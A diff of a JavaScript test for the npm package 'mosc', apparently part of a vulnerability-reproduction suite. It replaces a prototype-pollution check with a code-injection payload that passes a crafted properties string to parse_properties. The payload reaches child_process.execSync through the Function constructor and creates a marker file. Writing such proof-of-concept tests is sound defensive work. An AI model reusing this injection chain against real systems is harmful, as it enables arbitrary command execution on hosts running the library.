@@ -1,15 +1,21 @@
 test("Arbitrary code execution in mosc", () => {
-  expect.assertions(2);
   const fs = require("fs");
+  const path = "./mosc";
+
+  expect.assertions(2);
+  fs.unlink(path, function (err) {});
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
   var A = require("mosc");
-  expect({}.polluted).toBe(undefined);
   let a = new A({});
   let key = "";
-  let attack_code = "1 + (Object.prototype.polluted = `yes`)";
+  let attack_code = `1 + (import('test').catch((e)=>{})['constructor']['constructor']('return process')().mainModule.require('child_process').execSync('touch ${path}'))`;
   let properties = "{a:*1*; " + attack_code + " //*}";
   let base = "";
   try {
     a.parse_properties(key, properties, {}, {});
-  } catch (error) {}
-  expect({}.polluted).toBe("yes");
+  } catch (error) {console.log(error)}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(true);
+  fs.unlink(path, function (err) {});
 });
